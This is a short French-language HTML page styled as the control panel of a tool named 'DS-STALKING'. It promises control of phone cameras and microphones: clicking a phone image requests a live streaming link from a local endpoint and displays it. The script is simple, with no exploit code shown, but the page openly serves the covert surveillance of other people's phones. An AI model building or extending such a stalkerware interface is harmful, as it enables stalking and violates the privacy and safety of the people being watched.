<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contrôlez la Caméra et le Micro</title>
</head>
<body>
    <h1>Bienvenue dans DS-STALKING</h1>
    <p>Cliquez sur l'image du téléphone pour obtenir un lien de streaming en direct.</p>

    <div id="phones">
        <img src="phone1.jpg" alt="Phone 1" class="phone-image" data-phone-id="1">
        <img src="phone2.jpg" alt="Phone 2" class="phone-image" data-phone-id="2">
        <img src="phone3.jpg" alt="Phone 3" class="phone-image" data-phone-id="3">
        <!-- Ajoutez plus d'images si nécessaire -->
    </div>

    <p id="streamLink"></p>

    <script>
        // Quand une image est cliquée, un lien de streaming est généré
        document.querySelectorAll('.phone-image').forEach(function(img) {
            img.addEventListener('click', function() {
                var phoneId = img.getAttribute('data-phone-id');

                fetch(`/get_stream_link/${phoneId}`, {
                    method: 'POST',  // Requête POST pour obtenir le lien
                })
                .then(response => response.json())
                .then(data => {
                    // Afficher le lien de streaming dans le HTML
                    document.getElementById('streamLink').textContent = 'Lien de streaming : ' + data.stream_url;
                })
                .catch(error => {
                    console.error('Erreur:', error);
                });
            });
        });
    </script>
</body>
</html>
